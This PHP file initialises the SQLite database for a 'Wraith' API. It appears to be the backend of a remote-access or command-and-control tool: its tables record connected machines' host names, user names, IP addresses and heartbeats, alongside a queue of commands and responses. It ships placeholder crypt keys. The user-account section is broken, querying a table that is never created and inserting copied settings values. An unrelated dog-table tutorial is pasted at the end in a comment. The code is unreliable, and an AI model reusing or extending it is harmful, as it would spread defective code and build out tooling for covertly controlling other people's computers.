<?php

// SQLite database file location relative to API.php
$DATABASE_LOCATION = "./storage/wraithdb";

// Get a database instance
// This can be edited to use MySQL or equivalent databases. As long as
// there is a $db variable holding a PDO database connection
// all should work (untested).
$db = new PDO("sqlite:" . $DATABASE_LOCATION);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


// Check whether the database is initialised
try {

    $db->query("SELECT * FROM DB_INIT_INDICATOR")->fetchAll();

} catch (PDOException $e) {

    // If not, prepare the database

    // Commands to be executed to initialise the database
    $db_init_commands = [
        // Settings table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
            `WraithMarkOfflineDelaySeconds` INTEGER,
            `WraithInitialCryptKey` TEXT,
            `WraithSwitchCryptKey` TEXT,
            `ServerFingerprint` TEXT,
            `DefaultCommand` TEXT,
            `APIPrefix` TEXT
        );",
        // Statistics table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
            `DatabaseSetupTime` INTEGER,
            `LifetimeWraithConnections` INTEGER,
            `CurrentActiveWraiths` INTEGER,
            `MostRecentWraithLogin` TEXT,
            `WraithUploads` INTEGER,
            `CommandsIssued` INTEGER,
            `CommandsExecuted` INTEGER
        );",
        // Connected Wraiths table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Wraiths` (
            `AssignedID` TEXT,
            `Fingerprint` TEXT,
            `ReportedIP` TEXT,
            `ConnectingIP` TEXT,
            `OSType` TEXT,
            `SystemName` TEXT,
            `HostUserName` TEXT,
            `WraithVersion` TEXT,
            `HeartbeatsReceived` INTEGER,
            `LastHeartbeatTime` INTEGER
        );",
        // Command queue table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Commands` (
            `CommandID` TEXT,
            `CommandName` TEXT,
            `CommandParams` TEXT,
            `CommandTargets` TEXT,
            `CommandResponses` TEXT,
            `TimeIssued` INTEGER
        );",
        // Initialisation marker
        "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
            `DB_INIT_INDICATOR` INTEGER
        );"
    ];

    // Execute the SQL queries to initialise the database
    foreach ($db_init_commands as $command) {
        $db->exec($command);
    }

}

// Check whether a settings entry exists
try {

    // Get the first row of the settings table
    $SETTINGS = $db->query("SELECT * FROM WraithAPI_Settings LIMIT 1")->fetchAll();

    // The row is returned within another array by fetchAll(). If the length of
    // that array is 0, there are no rows so raise an exception to create one
    if (sizeof($SETTINGS) == 0) { throw new Exception(""); }

    // If an exception was not raised, there is a settings entry, so use it
    $SETTINGS = $SETTINGS[0];

} catch (Exception $e) {

    // Create default settings entry if not

    $settings_entry_creation_command = "INSERT INTO `WraithAPI_Settings` VALUES (
        '20',
        'QWERTYUIOPASDFGHJKLZXCVBNM',
        'QWERTYUIOPASDFGHJKLZXCVBNM_switch',
        'ABCDEFGHIJKLMNOP',
        '',
        'W_'
    );";

    $db->exec($settings_entry_creation_command);

    // Fetch the settings again
    $SETTINGS = $db->query("SELECT * FROM WraithAPI_Settings LIMIT 1")->fetchAll()[0];
}

// Check whether a user account exists
// There has to be a way to manage the API so if there are no users,
// create one.
try {

    $API_USERS = $db->query("SELECT * FROM WraithAPI_Users")->fetchAll();

    if (sizeof($API_USERS) == 0) {
        throw new Exception("");
    }

} catch (Exception $e) {

    // Create default settings entry if not

    $users_entry_creation_command = "INSERT INTO `WraithAPI_Users` VALUES (
        '20',
        'QWERTYUIOPASDFGHJKLZXCVBNM',
        'QWERTYUIOPASDFGHJKLZXCVBNM_switch',
        'ABCDEFGHIJKLMNOP',
        '',
        'W_'
    );";

    $db->exec($settings_entry_creation_command);

    // Fetch the settings again
    $SETTINGS = $db->query("SELECT * FROM WraithAPI_Settings LIMIT 1")->fetchAll()[0];
}

// Functions for database management

// Check which Wraiths have not sent a heartbeat in the mark dead time and remove
// them from the database

/*
try {
  //open the database
  $db = new PDO(`sqlite:dogsDb_PDO.sqlite`);

  //create the database
  $db->exec("CREATE TABLE Dogs (Id INTEGER PRIMARY KEY, Breed TEXT, Name TEXT, Age INTEGER)");

  //insert some data...
  $db->exec("INSERT INTO Dogs (Breed, Name, Age) VALUES (`Labrador`, `Tank`, 2);".
             "INSERT INTO Dogs (Breed, Name, Age) VALUES (`Husky`, `Glacier`, 7); " .
             "INSERT INTO Dogs (Breed, Name, Age) VALUES (`Golden-Doodle`, `Ellie`, 4);");

  //now output the data to a simple html table...
  print "<table border=1>";
  print "<tr><td>Id</td><td>Breed</td><td>Name</td><td>Age</td></tr>";
  $result = $db->query(`SELECT * FROM Dogs`);
  foreach($result as $row)
  {
    print "<tr><td>".$row[`Id`]."</td>";
    print "<td>".$row[`Breed`]."</td>";
    print "<td>".$row[`Name`]."</td>";
    print "<td>".$row[`Age`]."</td></tr>";
  }
  print "</table>";

  // close the database connection
  $db = NULL;
}
catch(PDOException $e)
{
  print `Exception : `.$e->getMessage();
}
*/
